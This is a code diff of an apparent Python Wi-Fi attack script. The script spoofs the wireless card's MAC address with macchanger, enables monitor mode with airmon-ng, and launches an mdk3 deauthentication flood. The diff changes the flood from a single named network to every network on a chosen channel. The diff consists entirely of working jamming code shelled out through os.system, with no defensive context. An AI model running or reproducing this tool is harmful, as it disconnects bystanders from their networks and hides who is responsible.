@@ -34,8 +34,7 @@ wlancard = raw_input("Please select one Wireless extension: ")
 os.system('cat card.txt | grep -n ^ | grep '+wlancard+' | cut -d: -f2 > card.sh')
 print("")
 os.system('cat card.sh && echo "#############################################################"')
-os.system('cat card.sh && echo "#############################################################"')
-
+os.system('clear')
 
 print("Changing the mac addrrs: ")
 os.system('card=`cat card.sh` && ifconfig $card down && macchanger -r $card && ifconfig $card up')
@@ -63,7 +62,7 @@ print("")
 if way == 1:
   os.system("card=`cat card.sh` && choose=`cat choose` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname $card | awk '{print FS2 $7}' | sed '/$choose/p; d' > targ")
   os.system('card=`cat card.sh` && ch=`cat chan` && airmon-ng start $card $ch')
-  os.system('card=`cat card.sh`mon && choose=`cat choose` && target=`cat targ` && mdk3 $card d -n "$target"')
+  os.system('card=`cat card.sh`mon && choose=`cat choose` && ch=`cat chan` && mdk3 $card d -c $ch')
   print("Wait..")
   os.system('card=`cat card.sh`mon && ch=`cat chan` && airmon-ng stop $card')
 else:
